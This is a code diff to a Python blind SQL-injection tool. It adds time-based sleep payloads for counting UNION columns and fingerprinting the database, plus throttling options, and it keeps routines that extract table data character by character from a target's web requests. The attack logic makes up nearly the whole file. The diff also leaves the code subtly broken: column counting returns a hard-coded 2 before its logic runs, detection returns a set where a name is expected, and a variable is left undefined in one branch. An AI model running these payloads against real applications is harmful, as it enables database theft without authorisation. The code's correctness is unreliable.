@@ -6,7 +6,6 @@ import json
 import os
 import sys
 import select
-import multiprocessing
 from urllib.parse import quote
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -14,6 +13,7 @@ CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
 
 
 ### Constants and Usage
+
 
 def usage():
     usage = """
@@ -56,14 +56,24 @@ def usage():
 
 
 def load_queries():
-    file_path = os.path.join(os.path.dirname(__file__), 'queries.json')
+    queries_file = os.path.join(os.path.dirname(__file__), 'queries.json')
+    sleep_file = os.path.join(os.path.dirname(__file__), 'sleep.json')
+
     try:
-        with open(file_path, 'r') as file:
+        with open(queries_file, 'r') as file:
             queries = json.load(file)
-        return queries
     except Exception as e:
         print(f"Error loading version queries: {e}")
-        return {}
+        queries = {}
+
+    try:
+        with open(sleep_file, 'r') as file:
+            sl_queries = json.load(file)
+    except Exception as e:
+        print(f"Error loading sleep queries: {e}")
+        sl_queries = {}
+
+    return {"queries": queries, "sl_queries": sl_queries}
 
 
 def max_workers(args):
@@ -79,6 +89,7 @@ def max_workers(args):
 
 
 ### Main Logic
+
 
 def is_injectable(request_template, injectable_headers={}, static_headers={}, args=None):
     """
@@ -164,10 +175,14 @@ def is_injectable(request_template, injectable_headers={}, static_headers={}, ar
         return False, None
 
 
-def column_count(detection, request_template, injectable_headers, static_headers, args=None):
+def column_count(detection, workers, request_template, queries, injectable_headers, static_headers, args=None):
     """
-    we're countin columns baybeee
+    Counting columns, using either sleep-based detection from 'sl_queries' or regular payloads without sleep.
     """
+
+    return 2
+
+    print("[*] Attempting to count columns...")
 
     # Step 1: Baseline request
     try:
@@ -178,53 +193,68 @@ def column_count(detection, request_template, injectable_headers, static_headers
         print(f"[-] Error during baseline request: {e}")
         return None
 
-    # Step 2: Count columns
-    columns = 0
+    # Step 2: Prepare queries
+    sleep_queries = queries.get("sleep_queries", [])
+    tasks = []
     columns_found = False
-    while not columns_found:
-        if columns > 0:
-            payload = f"' UNION SELECT {','.join(['NULL'] * columns)},'1'='1"
-        else:
-            payload = "' UNION SELECT '1'='1"
-        encoded_payload = quote(payload)
+    columns = 1
 
-        try:
-            response, response_time = inject(
-                encoded_payload=encoded_payload,
-                request_template=request_template,
-                injectable_headers=injectable_headers,
-                static_headers=static_headers,
-                args=args
-            )
+    with ThreadPoolExecutor(max_workers=workers) as executor:
+        while not columns_found:
+            if args.sleep_only:
+                for sleep_query in sleep_queries:
+                    if not sleep_query or sleep_query == "N/A":
+                        print(f"[-] Invalid or unavailable sleep query. Skipping...")
+                        continue
+                    sleep_query = sleep_query.replace('%', str(args.sleep_only))
 
-            if response is None:
-                return None
+                    payload = f"' AND {sleep_query} UNION SELECT {','.join(['NULL'] * columns)},'1'='1"
+                    encoded_payload = quote(payload)
+                    if args.delay > 0:
+                        if args.verbose:
+                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                        time.sleep(args.delay)
 
-            if args.sleep_only and response_time > args.sleep_only:
-                return columns
+                    tasks.append(executor.submit(detect, db_name="unknown", encoded_payload=encoded_payload,
+                                                 detection=detection,
+                                                 baseline_status_code=baseline_status_code,
+                                                 baseline_content_length=baseline_content_length,
+                                                 request_template=request_template,
+                                                 injectable_headers=injectable_headers,
+                                                 static_headers=static_headers,
+                                                 sleep_query=sleep_query, args=args,
+                                                 db_specific=None, queries=queries))
             else:
-                if detection == "keyword":
-                    if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
-                        return columns
-                    if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
-                        return None
-                elif detection == "status":
-                    if response.status_code == baseline_status_code:
-                        return columns
-                elif detection == "content":
-                    response_content_length = len(response.text)
-                    if response_content_length != baseline_content_length:
-                        return columns
+                payload = f"' UNION SELECT {','.join(['NULL'] * columns)}, '1'='1"
+                encoded_payload = quote(payload)
+                if args.delay > 0:
+                    if args.verbose:
+                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                    time.sleep(args.delay)
+
+                tasks.append(
+                    executor.submit(detect, db_name="unknown", encoded_payload=encoded_payload, detection=detection,
+                                    baseline_status_code=baseline_status_code,
+                                    baseline_content_length=baseline_content_length,
+                                    request_template=request_template, injectable_headers=injectable_headers,
+                                    static_headers=static_headers, sleep_query=None, args=args,
+                                    db_specific=None, queries=queries))
+
+            # Step 3: Wait for results
+            for future in as_completed(tasks):
+                result = future.result()
+                if result is True or (isinstance(result, tuple) and result[0] is True):
+                    columns += 1
+                    print(f"[+] Found {columns} columns")
+                    return columns
 
             columns += 1
 
-        except requests.exceptions.RequestException as e:
-            print(f"[-] Error during column counting: {e}")
-            return None
+    print(f"[-] Unable to detect the column count.")
+    return None
 
 
-
-def detect_database(detection, workers, request_template, queries, injectable_headers={}, static_headers={}, args=None):
+def detect_database(detection, columns, workers, request_template, queries, sl_queries, injectable_headers={}, static_headers={}, args=None):
     """
     attempts to determine what we're dealing with. detection happens in two stages because of the way the json is structured. 
     in the case that the version query is used for multiple databases, a second batch of requests is sent to determine a more specific database.
@@ -235,6 +265,8 @@ def detect_database(detection, workers, request_template, queries, injectable_he
     """
 
     print("[*] Attempting to detect the database type...")
+
+    adjusted_columns = columns - 2
 
     if args.verbose and not args.sleep_only:
         print(f"[VERBOSE] Detection method: {detection}")
@@ -248,84 +280,149 @@ def detect_database(detection, workers, request_template, queries, injectable_he
         print(f"[-] Error during baseline request: {e}")
         return None, None
 
-
-    # Step 2: Prepare queries
+    # Step 2: Sleep-only detection
     tasks = []
-    with ThreadPoolExecutor(max_workers=workers) as executor:
-        for db_name, info in queries.items():
-            db_query = info.get("version_query")
-            sleep_function = info.get("sleep_query", None)
-            payload = f"' AND ({db_query})"
-            encoded_payload = quote(payload)
-            if args.sleep_only:
-                if isinstance(sleep_function, dict):
-                    sleep_queries = sleep_function.items()
-                else:
-                    sleep_queries = [(None, sleep_function)]
-                for db_specific, sleep_query in sleep_queries:
-                    sleep_query = sleep_query.replace('%', str(args.sleep_only))
-                    if not sleep_query or sleep_query == "N/A":
-                        print(
-                            f"[-] Sleep function for {db_specific} in {db_name} is not applicable or not found. Skipping...")
-                        continue
-                    payload = f"' AND {sleep_query}"
-                    encoded_payload = quote(payload)
+    if args.sleep_only:
+        sleep_queries = sl_queries.get("sleep_queries", [])
+        print(f"[*] Using sleep-only detection with {len(sleep_queries)} unique sleep queries.")
+        with ThreadPoolExecutor(max_workers=workers) as executor:
+            for sleep_query in sleep_queries:
+                sleep_query = sleep_query.replace('%', str(args.sleep_only))
+                payload = f"' AND {sleep_query} AND '1'='1"
+                encoded_payload = quote(payload)
+                if args.delay > 0:
+                    if args.verbose:
+                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                    time.sleep(args.delay)
 
-                    tasks.append(executor.submit(detect, db_name=db_name, db_specific=db_specific, encoded_payload=encoded_payload, baseline_status_code=baseline_status_code,
-                                                 baseline_content_length=baseline_content_length, request_template=request_template, queries=queries, sleep_query=sleep_query,
-                                                 injectable_headers=injectable_headers, static_headers=static_headers, detection=detection, args=args))
-            else:
-                db_specific = None
-                tasks.append(executor.submit(detect, db_name=db_name, encoded_payload=encoded_payload, baseline_status_code=baseline_status_code,
-                                             baseline_content_length=baseline_content_length, request_template=request_template, queries=queries,
+                tasks.append(executor.submit(detect, db_name="unknown", db_specific=None, encoded_payload=encoded_payload,
+                                             baseline_status_code=baseline_status_code, baseline_content_length=baseline_content_length,
+                                             request_template=request_template, queries=queries, sleep_query=sleep_query,
                                              injectable_headers=injectable_headers, static_headers=static_headers, detection=detection, args=args))
 
-        # Step 3: Wait for results
-        for future in as_completed(tasks):
-            result = future.result()
-            if result:
-                db_name, substring_query, sleep_query, length_query = result
-                print(f"[+] Database detected: {db_name}")
-                sleep_function = queries[db_name].get("sleep_query", None)
-                # Step 4: Narrow down the database if needed
-                if isinstance(sleep_function, dict):
-                    print(f"[*] Narrowing down to the specific database version...")
-                    og_sleep_only = args.sleep_only
-                    args.sleep_only = 10
-                    specific_tasks = []
-                    with ThreadPoolExecutor(max_workers=workers) as specific_executor:
-                        for db_specific, sleep_query in sleep_function.items():
-                            sleep_query = sleep_query.replace('%', str(args.sleep_only))
-                            if not sleep_query or sleep_query == "N/A":
-                                print(
-                                    f"[-] Sleep function for {db_specific} is not applicable or not found. Skipping...")
-                                continue
-                            payload = f"' AND {sleep_query}"
-                            encoded_payload = quote(payload)
+            # Step 3: Wait for sleep query results
+            for future in as_completed(tasks):
+                result = future.result()
+                if result and result[0] is True:
+                    sleep_query = result[1]
+                    print(f"[+] Sleep-based detection with query {sleep_query}")
+                    # Step 4: Check version queries
+                    print(f"[*] Checking associated version queries")
+                    version_tasks = []
+                    with ThreadPoolExecutor(max_workers=workers) as version_executor:
+                        for db_name, info in queries.items():
+                            sleep_function = queries[db_name].get("sleep_query", None)
+                            if isinstance(sleep_function, dict):
+                                sleep_queries = sleep_function.items()
+                            else:
+                                sleep_queries = [(None, sleep_function)]
+                            for db_specific, query in sleep_queries:
+                                query = query.replace('%', str(args.sleep_only))
+                                if query == sleep_query:
+                                    version_query = info.get("version_query")
+                                else:
+                                    continue
+                                if version_query:
+                                    payload = f"' AND {query} UNION {version_query}{',' if adjusted_columns != 0 else ''}{','.join(['NULL'] * adjusted_columns)},'1'='1"
+                                    encoded_payload = quote(payload)
+                                    if args.delay > 0:
+                                        if args.verbose:
+                                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                                        time.sleep(args.delay)
 
-                            specific_tasks.append(
-                                specific_executor.submit(detect, db_name=db_name, db_specific=db_specific, encoded_payload=encoded_payload,
-                                                         baseline_status_code=baseline_status_code, baseline_content_length=baseline_content_length,
-                                                         request_template=request_template, queries=queries, sleep_query=sleep_query,
-                                                         injectable_headers=injectable_headers, static_headers=static_headers, detection=detection, args=args))
 
-                        # Step 5: Wait for more specific results
-                        for specific_future in as_completed(specific_tasks):
-                            specific_result = specific_future.result()
-                            if specific_result:
-                                db_name, substring_query, sleep_query, length_query = specific_result
-                                print(f"[+] Narrowed down to specific database: {db_specific}")
-                                args.sleep_only = og_sleep_only
-                                return db_name, substring_query, sleep_query, length_query
+                                version_tasks.append(version_executor.submit(detect, db_name=db_name, db_specific=db_specific, encoded_payload=encoded_payload,
+                                                                     baseline_status_code=baseline_status_code,
+                                                                     baseline_content_length=baseline_content_length,
+                                                                     request_template=request_template, queries=queries,
+                                                                     detection=detection, injectable_headers=injectable_headers,
+                                                                     static_headers=static_headers, sleep_query=query, args=args))
 
-                return db_name, substring_query, sleep_query, length_query
+                        # Step 5: Wait for results from version query detection
+                        for version_future in as_completed(version_tasks):
+                            result = version_future.result()
+                            if result:
+                                db_specific, substring_query, sleep_query, length_query = result
+                                print(f"[+] Database confirmed with version query: {db_specific}")
+                                return db_specific, substring_query, sleep_query, length_query
 
-    print(f"[-] Unable to detect the database type. Exiting")
+                    print(f"[-] No database confirmed with version queries.")
+                    return None, None, None, None
+
+    else:
+        # Step 6: Standard detection
+        print("[*] Running standard detection without sleep-only logic.")
+        tasks = []
+        with ThreadPoolExecutor(max_workers=workers) as executor:
+            for db_name, info in queries.items():
+                db_query = info.get("version_query")
+                payload = f"' UNION {db_query}{',' if adjusted_columns != 0 else ''}{','.join(['NULL'] * adjusted_columns)},'1'='1"
+                encoded_payload = quote(payload)
+                if args.delay > 0:
+                    if args.verbose:
+                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                    time.sleep(args.delay)
+
+                tasks.append(executor.submit(detect, db_name=db_name, encoded_payload=encoded_payload,
+                                             baseline_status_code=baseline_status_code,
+                                             baseline_content_length=baseline_content_length, request_template=request_template,
+                                             queries=queries, injectable_headers=injectable_headers, static_headers=static_headers,
+                                             detection=detection, args=args))
+
+            # Step 7: Wait for standard detection results
+            for future in as_completed(tasks):
+                result = future.result()
+                if result:
+                    db_name, substring_query, sleep_query, length_query = result
+                    print(f"[+] Database detected: {db_name}")
+                    sleep_function = queries[db_name].get("sleep_query", None)
+                    # Step 8: Narrow down the database if needed
+                    if isinstance(sleep_function, dict):
+                        print(f"[*] Narrowing down to the specific database version...")
+                        og_sleep_only = args.sleep_only
+                        args.sleep_only = 10
+                        specific_tasks = []
+                        with ThreadPoolExecutor(max_workers=workers) as specific_executor:
+                            for db_specific, sleep_query in sleep_function.items():
+                                sleep_query = sleep_query.replace('%', str(args.sleep_only))
+                                if not sleep_query or sleep_query == "N/A":
+                                    print(
+                                        f"[-] Sleep function for {db_specific} is not applicable or not found. Skipping...")
+                                    continue
+                                payload = f"' AND {sleep_query} AND '1'='1"
+                                encoded_payload = quote(payload)
+                                if args.delay > 0:
+                                    if args.verbose:
+                                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                                    time.sleep(args.delay)
+
+                                specific_tasks.append(
+                                    specific_executor.submit(detect, db_name=db_name, db_specific=db_specific,
+                                                             encoded_payload=encoded_payload,
+                                                             baseline_status_code=baseline_status_code,
+                                                             baseline_content_length=baseline_content_length,
+                                                             request_template=request_template, queries=queries,
+                                                             sleep_query=sleep_query,
+                                                             injectable_headers=injectable_headers,
+                                                             static_headers=static_headers, detection=detection,
+                                                             args=args))
+
+                            # Step 5a: Wait for more specific results
+                            for specific_future in as_completed(specific_tasks):
+                                specific_result = specific_future.result()
+                                if specific_result:
+                                    db_name, substring_query, sleep_query, length_query = specific_result
+                                    print(f"[+] Narrowed down to specific database: {db_specific}")
+                                    args.sleep_only = og_sleep_only
+                                    return db_specific, substring_query, sleep_query, length_query
+                    else:
+                        return db_name, substring_query, sleep_query, length_query
+
+    print(f"[-] Unable to detect the database type. Exiting.")
     return None, None, None, None
 
 
-def discover_length(table, column, where_clause, db_name, substring_query, sleep_query, length_query, detection,
-                    request_template, injectable_headers={}, static_headers={}, args=None):
+def discover_length(table, column, where_clause, db_name, substring_query, sleep_query, length_query, detection, request_template, injectable_headers={}, static_headers={}, args=None):
     """
     to optimize the data extraction process, we need the length of the data. this function uses a binary search algorithm to narrow down the length of the data. 
     the maximum length that this function will search for is determined by the user (hopefully) but defaults to 1000 if a length isn't provided.
@@ -356,9 +453,17 @@ def discover_length(table, column, where_clause, db_name, substring_query, sleep
         mid = (low + high) // 2
         payload = f"' AND {length_query}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
         encoded_payload = quote(payload)
+        if args.delay > 0:
+            if args.verbose:
+                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+            time.sleep(args.delay)
         if args.sleep_only and sleep_query:
             payload = f"' AND {sleep_query} AND {length_query}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
             encoded_payload = quote(payload)
+            if args.delay > 0:
+                if args.verbose:
+                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                time.sleep(args.delay)
 
         try:
             response, response_time = inject(
@@ -411,8 +516,7 @@ def discover_length(table, column, where_clause, db_name, substring_query, sleep
         return db_name, substring_query, sleep_query, None
 
 
-def extract_data(table, column, where_clause, substring_query, sleep_query, length, position, extraction, workers,
-                 request_template, injectable_headers={}, static_headers={}, args=None):
+def extract_data(table, column, where_clause, substring_query, sleep_query, length, position, extraction, workers, request_template, injectable_headers={}, static_headers={}, args=None):
     """
     now we're cookin with gas. this function extracts data in a variety of ways, but the default behavior is a threaded charcter-by-character approach. 
     if that doesnt tickle your fancy, you can provide a dictionary or use a binary search algorithm. the world is your oyster or something.
@@ -452,6 +556,10 @@ def extract_data(table, column, where_clause, substring_query, sleep_query, leng
                 mid = (low + high) // 2
                 payload = f"' AND ASCII({substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)) > {mid}"
                 encoded_payload = quote(payload)
+                if args.delay > 0:
+                    if args.verbose:
+                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                    time.sleep(args.delay)
 
                 result = extract(
                     extraction, request_template, injectable_headers, static_headers,
@@ -488,12 +596,21 @@ def extract_data(table, column, where_clause, substring_query, sleep_query, leng
                 if wordlist and len(value) > (length - position + 1):
                     continue
 
-                payload = f"' AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {len(value)}) = '{value}"
-                encoded_payload = quote(payload)
-                # Sleep only override for encoded payload
+
                 if args.sleep_only and sleep_query:
                     payload = f"' AND {sleep_query} AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {len(value)}) = '{value}'"
                     encoded_payload = quote(payload)
+                    if args.delay > 0:
+                        if args.verbose:
+                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                        time.sleep(args.delay)
+                else:
+                    payload = f"' AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {len(value)}) = '{value}"
+                    encoded_payload = quote(payload)
+                    if args.delay > 0:
+                        if args.verbose:
+                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                        time.sleep(args.delay)
 
                 tasks.append(executor.submit(extract, encoded_payload, value, extraction, request_template,
                                              injectable_headers, static_headers, baseline_status_code,
@@ -518,6 +635,10 @@ def extract_data(table, column, where_clause, substring_query, sleep_query, leng
                         mid = (low + high) // 2
                         payload = f"' AND ASCII({substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)) > {mid}"
                         encoded_payload = quote(payload)
+                        if args.delay > 0:
+                            if args.verbose:
+                                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                            time.sleep(args.delay)
 
                         result = extract(
                             extraction, request_template, injectable_headers, static_headers,
@@ -548,6 +669,7 @@ def extract_data(table, column, where_clause, substring_query, sleep_query, leng
 
 
 ### Prompts
+
 
 def no_length():
     print("[-] Unable to determine data length. Do you want to proceed with extraction without data length? (y/n): ",
@@ -603,6 +725,7 @@ def spent():
 
 
 ### Helper Functions <3
+
 
 def load_request(file_path):
     try:
@@ -741,11 +864,6 @@ def inject(encoded_payload, request_template, injectable_headers, static_headers
             print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
             print(f"[VERBOSE] Request time: {response_time} seconds")
 
-            if args.delay > 0:
-                if args.verbose:
-                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
-                time.sleep(args.delay)
-
         return response, response_time
 
     except requests.exceptions.RequestException as e:
@@ -753,17 +871,16 @@ def inject(encoded_payload, request_template, injectable_headers, static_headers
         return None, None
 
 
-def detect(encoded_payload, db_name, detection, queries, injectable_headers,
-           static_headers, baseline_status_code, baseline_content_length, request_template=None, db_specific=None, sleep_query=None, args=None):
+def detect(encoded_payload, db_name, detection, queries, injectable_headers, static_headers, baseline_status_code, baseline_content_length, request_template=None, db_specific=None, sleep_query=None, args=None):
     """
     handles the detection for detect_database and provides the helper function, inject, with the encoded payload and request info.
     no actual request is sent by this function. it relies on the helper function, inject.
     this function also finds the related queries of the database its currently handling and passes them along.
     """
-
-    substring_query = queries[db_name].get("substring_query", None)
-    length_function = queries[db_name].get("length_query", None)
-    length_query = None
+    if db_name != "unknown":
+        substring_query = queries[db_name].get("substring_query", None)
+        length_function = queries[db_name].get("length_query", None)
+        length_query = None
 
     if db_specific is not None:
         if isinstance(length_function, dict):
@@ -772,7 +889,6 @@ def detect(encoded_payload, db_name, detection, queries, injectable_headers,
             length_query = length_function
 
     try:
-        print(encoded_payload)
         response, response_time = inject(
             encoded_payload=encoded_payload,
             request_template=request_template,
@@ -787,16 +903,28 @@ def detect(encoded_payload, db_name, detection, queries, injectable_headers,
         print (response)
 
         if args.sleep_only and (response_time > args.sleep_only):
-            return db_name, substring_query, sleep_query, length_query if length_query is not None else length_function
+            if db_name == "unknown":
+                return True, sleep_query
+            else:
+                return {db_specific if db_specific else db_name}, substring_query, sleep_query, length_query if length_query is not None else length_function
         else:
             if detection == "status" and response.status_code == baseline_status_code:
-                return db_name, substring_query, None, length_query if length_query is not None else length_function
+                if db_name == "unknown":
+                    return True
+                else:
+                    return {db_specific if db_specific else db_name}, substring_query, None, length_query if length_query is not None else length_function
             elif detection == "content" and len(response.text) != baseline_content_length:
-                return db_name, substring_query, None, length_query
+                if db_name == "unknown":
+                    return True
+                else:
+                    return {db_specific if db_specific else db_name}, substring_query, None, length_query
             elif detection == "keyword":
                 if args.true_keywords:
                     if any(keyword in response.text for keyword in args.true_keywords):
-                        return db_name, substring_query, None, length_query if length_query is not None else length_function
+                        if db_name == "unknown":
+                            return True
+                        else:
+                            return {db_specific if db_specific else db_name}, substring_query, None, length_query if length_query is not None else length_function
                 elif args.false_keywords:
                     if any(keyword in response.text for keyword in args.false_keywords):
                         return None
@@ -808,8 +936,7 @@ def detect(encoded_payload, db_name, detection, queries, injectable_headers,
     return None
 
 
-def extract(encoded_payload, value, extraction, request_template, injectable_headers, static_headers,
-            baseline_status_code, baseline_content_length, args=None):
+def extract(encoded_payload, value, extraction, request_template, injectable_headers, static_headers, baseline_status_code, baseline_content_length, args=None):
     """
     not a whole lot going on here. this fucntion handles detection for extract_data, and provides the helper function, inject, with the encoded payload and request info.
     no actual request is sent by this function. it relies on the helper fucntion, inject. 
@@ -886,7 +1013,7 @@ def arg_parse():
     parser.add_argument('--false-keywords', nargs='+',
                         help="Keywords to search for in the false condition (e.g., 'Error', 'Invalid')")
     parser.add_argument('--sleep-only', type=int,
-                        help="Use sleep-based detection methods strictly. Accepts whole numbers as sleep times. Sleep time must be >= 1. Smaller numbers are more likely to produce false positives. At least 10 seconds is recommended.")
+                        help="Use sleep-based detection methods strictly. Accepts whole numbers as sleep times. Sleep time must be >= 1. Smaller numbers are more likely to produce false positives. 10 seconds is recommended.")
     parser.add_argument('--force', type=str, choices=['status', 'content', 'keyword', 'sleep'],
                         help="Skip the check for an injectable field and force a detection method (status, content, keyword or sleep)")
 
@@ -912,11 +1039,13 @@ def arg_parse():
     if args.sleep_only and args.sleep_only < 1:
         print(
             "[!] Sleep time must be greater than or equal to 1. At least 10 seconds is recommended. Example: --sleep-only 3")
-
+    if args.sleep_only:
+        args.timeout += args.sleep_only
     return args
 
 
 ### MAIN
+
 
 def main():
     """
@@ -924,7 +1053,9 @@ def main():
     """
 
     args = arg_parse()
-    queries = load_queries()
+    json = load_queries()
+    queries = json['queries']
+    sl_queries = json['sl_queries']
     workers = max_workers(args)
     injectable_headers = dict(args.injectable_headers) if args.injectable_headers else {}
     static_headers = dict(args.static_headers) if args.static_headers else {}
@@ -943,27 +1074,27 @@ def main():
                 print("[!] You must provide keywords to force a keyword detection.")
                 return
         elif args.force == "sleep":
-            args.sleep_only = True
+            args.sleep_only = 10
+            args.timeout += args.sleep_only
+            detection = "sleep"
         else:
             detection = args.force
         print(f"[+] Skipping injection check and detection discovery. Using forced detection method: {detection}")
-
-    # Step 1: Check if the field is injectable
-    injectable, detection = is_injectable(injectable_headers=injectable_headers, static_headers=static_headers,
-                                          request_template=request_template, args=args)
-    if not injectable:
-        return
-    if not args.sleep_only:
-        print(f"[+] Using {detection} detection method.")
+    else:
+        # Step 1: Check if the field is injectable
+        injectable, detection = is_injectable(injectable_headers=injectable_headers, static_headers=static_headers,
+                                              request_template=request_template, args=args)
+        if not injectable:
+            return
+        if not args.sleep_only:
+            print(f"[+] Using {detection} detection method.")
 
     #Step 2: Count columns
-    columns = column_count(detection=detection, request_template=request_template, injectable_headers=injectable_headers, static_headers=static_headers, args=args)
-
-    print (columns)
+    columns = column_count(detection=detection, workers=workers, queries=sl_queries, request_template=request_template, injectable_headers=injectable_headers, static_headers=static_headers, args=args)
 
     # Step 3: Detect the database type
-    db_name, substring_query, sleep_query, length_query = detect_database(request_template=request_template, queries=queries, injectable_headers=injectable_headers,
-                                                                          static_headers=static_headers, workers=workers, detection=detection, args=args)
+    db_name, substring_query, sleep_query, length_query = detect_database(request_template=request_template, queries=queries, sl_queries=sl_queries, injectable_headers=injectable_headers,
+                                                                          static_headers=static_headers, workers=workers, detection=detection, columns=columns, args=args)
 
     if not db_name:
         return
